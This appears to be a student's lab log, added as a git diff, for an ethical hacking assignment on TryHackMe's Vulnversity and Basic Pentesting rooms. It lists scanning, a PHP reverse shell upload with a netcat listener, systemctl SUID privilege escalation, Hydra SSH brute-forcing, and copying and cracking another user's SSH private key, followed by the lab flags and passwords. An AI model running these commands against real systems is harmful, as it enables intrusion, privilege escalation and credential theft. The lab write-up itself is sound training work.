@@ -1,0 +1,100 @@
+=============================================================
+BITÁCORA TP A08 - HACKING ÉTICO
+Alumno: Facundo San Martin
+Username THM: cundosanmartin84
+Branch: SanMartin-Facundo
+Fecha: 07-08/10/2026
+=============================================================
+
+--- COMANDOS DE GIT (Windows / Git Bash) ---
+
+# Clonar repositorio
+git clone https://github.com/UCHSeguridad2026/TP_THM.git
+cd TP_THM
+
+# Crear branch personal
+git checkout -b tu-apellido-tu-nombre
+git branch -m SanMartin-Facundo
+
+# Configurar identidad
+git config user.name "Facundo San Martin"
+git config user.email "cundosanmartin84@gmail.com"
+
+# Crear estructura de carpetas
+mkdir -p evidencias/reconocimiento evidencias/escaneo evidencias/explotacion evidencias/post bitacora reportes
+
+# Copiar capturas a las carpetas del repo
+cp "C:/Users/cundo/OneDrive/Desktop/Nueva carpeta"/* ~/TP_THM/evidencias/reconocimiento/
+
+--- COMANDOS DE KALI LINUX (VM) ---
+
+--- Reconocimiento ---
+ip a | grep tun0
+ping -c 3 10.65.140.204
+ping -c 3 10.66.156.240
+
+# Conectar VPN THM
+sudo openvpn --config ~/Downloads/us-east-1-cundosanmartin84-regular.ovpn
+
+--- Escaneo (Vulnversity) ---
+nmap -sV -sC -oN ~/nmap_vulnversity.txt 10.65.140.204
+gobuster dir -u http://10.65.140.204:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+
+--- Escaneo (Basic Pentesting) ---
+nmap -sV -sC -p- --min-rate 5000 -oN ~/nmap_basic.txt 10.66.156.240
+gobuster dir -u http://10.66.156.240 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+enum4linux -a 10.66.156.240
+
+--- Explotación (Vulnversity - Reverse Shell) ---
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+nano php-reverse-shell.php    # Editar IP y puerto
+mv php-reverse-shell.php php-reverse-shell.phtml
+nc -lvnp 1234                 # Listener
+# Upload a http://10.65.140.204:3333/internal/
+# Trigger: http://10.65.140.204:3333/internal/uploads/php-reverse-shell.phtml
+
+--- Post-Explotación (Vulnversity - Escalada con systemctl SUID) ---
+find / -perm -4000 -type f 2>/dev/null
+TF=$(mktemp).service
+echo '[Service]' > $TF
+echo 'Type=oneshot' >> $TF
+echo 'ExecStart=/bin/sh -c "chmod +s /bin/bash"' >> $TF
+echo '[Install]' >> $TF
+echo 'WantedBy=multi-user.target' >> $TF
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+/bin/bash -p
+
+--- Explotación (Basic Pentesting - Hydra SSH) ---
+hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.66.156.240 -t 4
+# Alternativa más rápida:
+hydra -l jan -p armando ssh://10.66.156.240
+
+--- Acceso SSH como jan ---
+ssh jan@10.66.156.240
+
+--- Copiar clave SSH de kay ---
+cat /home/kay/.ssh/id_rsa > /tmp/kay_id_rsa
+
+--- Crackear passphrase con John ---
+ssh2john /tmp/kay_id_rsa > /tmp/kay_hash.txt
+john /tmp/kay_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+john --show /tmp/kay_hash.txt
+
+--- Acceso SSH como kay ---
+chmod 600 /tmp/kay_id_rsa
+ssh -i /tmp/kay_id_rsa kay@10.66.156.240
+cat /home/kay/pass.bak
+
+--- CREDENCIALES Y FLAGS OBTENIDAS ---
+User flag Vulnversity:        8bd7992fbe8a6ad22a63361004cfcedb
+Root flag Vulnversity:        a58ff8579f0a9270368d33a9966c7fd5
+Password SSH jan:             armando
+Passphrase id_rsa kay:        beeswax
+Password final kay:           heresareallystrongpasswordthatfollowsthepasswordpolicy$$
+
+--- NOTAS ---
+- VPN THM: us-east-1-cundosanmartin84-regular.ovpn
+- Kali Linux en VirtualBox (4 GB RAM, 2 CPUs)
+- Todas las técnicas aplicadas en entorno controlado (TryHackMe)
+- Ningún secreto real expuesto (credenciales de laboratorio)
